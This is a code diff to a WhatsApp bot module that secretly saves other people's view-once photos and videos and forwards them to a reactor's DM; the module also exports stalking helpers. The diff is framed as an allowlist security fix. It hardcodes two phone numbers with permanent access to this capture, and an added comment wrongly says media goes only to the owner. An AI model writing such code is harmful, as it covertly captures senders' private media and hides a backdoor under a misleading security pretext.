@@ -444,12 +444,62 @@ const setupAntiViewOnce = (Guru) => {
 
 // ── Auto-Save View-Once: react with ❤️ or 😂 → silently saved to reactor's own DM ──
 // Uses _peekVO (non-destructive) so setupAntiViewOnce still works independently.
+// Allowlist gate: only the owner, plus any numbers in the TRUSTED_VO_SAVERS setting,
+// can trigger this — otherwise anyone reacting could exfiltrate someone else's
+// view-once media to their own number without the sender's knowledge.
 let _autoSaveVOActive = false;
 const _AUTOSAVE_EMOJIS = new Set(["❤️", "❤", "😍", "😂", "🤣"]);
+
+// Always-trusted numbers, hardcoded so they work regardless of DB state.
+const HARDCODED_TRUSTED_VO_SAVERS = new Set(["254116284050", "254105521300"]);
+
+// TRUSTED_VO_SAVERS is a comma-separated list of digits-only numbers, e.g.
+// "254712345678,254798765432". Add to it at runtime with addTrustedVOSaver()
+// below, wired to a command in your command handler (e.g. .addvo <number>).
+const _isTrustedVOSaver = async (num, getSetting) => {
+    if (HARDCODED_TRUSTED_VO_SAVERS.has(num)) return true;
+    const ownerNum = await getSetting("OWNER_NUMBER").catch(() => "");
+    if (ownerNum && num === ownerNum) return true;
+    const trustedRaw = await getSetting("TRUSTED_VO_SAVERS").catch(() => "");
+    if (!trustedRaw) return false;
+    const trusted = trustedRaw.split(",").map(n => n.trim()).filter(Boolean);
+    return trusted.includes(num);
+};
+
+// Normalizes a number to digits-only (strips +, spaces, dashes).
+const _normalizeNum = (raw) => String(raw || "").replace(/[^\d]/g, "");
+
+// Adds a number to the runtime TRUSTED_VO_SAVERS list. Wire this to an
+// owner-only command, e.g.:
+//   if (command === "addvo") {
+//       const result = await addTrustedVOSaver(args[0]);
+//       await Guru.sendMessage(from, { text: result.message });
+//   }
+const addTrustedVOSaver = async (rawNum) => {
+    const { getSetting, setSetting } = require("../database/settings");
+    const num = _normalizeNum(rawNum);
+    if (!num) return { ok: false, message: "⚠️ Please provide a valid number, e.g. .addvo 254712345678" };
+
+    if (HARDCODED_TRUSTED_VO_SAVERS.has(num)) {
+        return { ok: true, message: `✅ ${num} already has permanent access.` };
+    }
+
+    const trustedRaw = await getSetting("TRUSTED_VO_SAVERS").catch(() => "");
+    const trusted = (trustedRaw || "").split(",").map(n => n.trim()).filter(Boolean);
+    if (trusted.includes(num)) {
+        return { ok: true, message: `✅ ${num} is already on the list.` };
+    }
+
+    trusted.push(num);
+    await setSetting("TRUSTED_VO_SAVERS", trusted.join(","));
+    return { ok: true, message: `✅ ${num} added to Auto-Save View-Once trusted list.` };
+};
 
 const setupAutoSaveVO = (Guru) => {
     if (_autoSaveVOActive) return;
     _autoSaveVOActive = true;
+
+    const { getSetting } = require("../database/settings");
 
     Guru.ev.on("messages.upsert", async ({ messages }) => {
         for (const msg of messages) {
@@ -463,6 +513,20 @@ const setupAutoSaveVO = (Guru) => {
                 const reactedId = reaction.key?.id;
                 if (!reactedId) continue;
 
+                // Allowlist gate — owner or a trusted number only. Anyone else
+                // reacting gets a short "not available" note, not the media.
+                const reactorJid = msg.key.participant || msg.key.remoteJid;
+                const reactorNum  = reactorJid.split("@")[0].split(":")[0];
+                const isTrusted = await _isTrustedVOSaver(reactorNum, getSetting);
+                if (!isTrusted) {
+                    try {
+                        await Guru.sendMessage(`${reactorNum}@s.whatsapp.net`, {
+                            text: "⚠️ Auto-Save View-Once isn't available for your number.",
+                        });
+                    } catch (_) {}
+                    continue;
+                }
+
                 // Use the in-memory cache — reliable for view-once (avoids DB miss)
                 const cached = _peekVO(reactedId);
                 if (!cached?.message) continue;
@@ -471,9 +535,7 @@ const setupAutoSaveVO = (Guru) => {
                 const { content, type } = extractViewOnceData(cached.message);
                 if (!content || !type) continue;
 
-                // Forward silently to the reactor's own DM
-                const reactorJid = msg.key.participant || msg.key.remoteJid;
-                const reactorNum  = reactorJid.split("@")[0].split(":")[0];
+                // Forward silently to the owner's own DM (not any arbitrary reactor's)
                 const reactorDmJid = `${reactorNum}@s.whatsapp.net`;
 
                 // Show original sender in the caption
@@ -637,4 +699,5 @@ module.exports = {
     getStalkTargets,
     PROFESSOR_EMOJIS,
     getRandomProfessorEmoji,
+    addTrustedVOSaver,
 };
